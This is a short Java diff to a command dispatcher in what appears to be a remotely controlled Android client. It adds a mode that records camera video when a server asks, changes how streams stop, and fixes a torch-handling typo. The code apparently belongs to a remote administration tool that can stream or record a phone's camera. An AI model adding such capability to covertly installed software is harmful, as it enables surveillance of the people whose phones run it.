@@ -311,22 +311,33 @@ public class ProcessCommand
 			v.vibrate(duration);
 
 		}
-		else if(commande == Protocol.TORCH){
-			client.torch = new Torch(client);
-			if (!client.torch.turnOnFlash()){
-				client.sendError("No Flash aviable");
-			}
-		}
+
 		else if (commande == Protocol.GET_VIDEO_STREAM){
 			client.sendInformation("Video streaming request received");
 			client.videoStreamer = new VideoStreamer(client,args,chan);
-			client.videoStreamer.startStream();
+			if(args[1] == 0) {
+				client.videoStreamer.startStream();
+			}
+			else{
+				client.videoStreamer.startRec();
+			}
 		}
 		else if (commande == Protocol.STOP_VIDEO_STREAM){
-			client.videoStreamer.stopStream();
+			if(client.videoStreamer.getRecord()) {
+				client.videoStreamer.stopRec();
+			}
+			else {
+				client.videoStreamer.stopStream();
+			}
 			client.videoStreamer = null;
 			client.sendInformation("Video streaming stopped");
 
+		}
+		else if(commande == Protocol.TORCH){
+			client.torch = new Torch(client);
+			if (!client.torch.turnOnFlash()){
+				client.sendError("No Flash available");
+			}
 		}
 		else if(commande == Protocol.STOP_TORCH){
 			client.torch.turnOffFlash();
